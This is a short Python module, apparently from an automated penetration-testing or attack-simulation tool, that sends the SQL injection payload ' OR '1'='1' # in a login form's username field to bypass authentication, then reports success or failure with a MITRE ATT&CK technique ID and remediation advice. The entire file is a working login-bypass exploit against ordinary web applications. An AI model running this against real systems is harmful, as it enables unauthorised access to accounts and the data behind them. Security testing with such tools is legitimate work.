import requests
from backend.utility_f import log

def run(target_url):
    # This payload safely closes the string and comments out the rest
    payload = "' OR '1'='1' #"

    try:
        response = requests.post(target_url, data={
            "username": payload,
            "password": "0000",
            "submit": "Login"
        }, allow_redirects=False)

        # Login success is identified by redirection to index.php or similar
        if response.status_code == 302 and "index.php" in response.headers.get("Location", ""):
            log(f"SQLi login bypass succeeded with payload: {payload}", level="success")
            return {
                "stage": "Initial Access",
                "technique_id": "T1190",
                "technique_name": "SQL Injection Login Bypass",
                "success": True,
                "details": f"Logged in using SQL injection payload: {payload}",
                "remediation": "Use parameterized queries and validate login credentials securely."
            }

    except Exception as e:
        log(f" SQLi error: {e}", level="error")

    return {
        "stage": "Initial Access",
        "technique_id": "T1190",
        "technique_name": "SQL Injection Login Bypass",
        "success": False,
        "details": "Login bypass failed or was blocked.",
        "remediation": "Avoid dynamic SQL. Use secure authentication handling."
    }
